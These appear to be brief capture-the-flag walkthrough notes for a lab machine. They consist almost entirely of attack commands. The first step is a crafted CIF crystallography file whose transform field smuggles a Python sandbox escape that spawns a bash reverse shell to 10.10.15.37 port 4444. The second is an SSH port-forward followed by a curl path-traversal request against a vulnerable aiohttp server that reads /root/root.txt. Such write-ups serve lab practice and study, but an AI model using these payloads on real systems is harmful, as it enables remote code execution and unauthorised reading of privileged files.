1.we upload payload:
vuln.cif
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().class.mro[1].getattribute ( *[().class.mro[1]]+["sub" + "classes"]) () if d.name == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.15.37/4444 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

2.
after ssh -L 1234:localhost:8080 rosa@ip 
we use dirsearch and found assets dir
we also found vulnerable version of aiohttp and exploit this with LFI
![[Pasted image 20250125213930.png]]
curl --path-as-is http://localhost:1234/assets/../../../../root/root.txt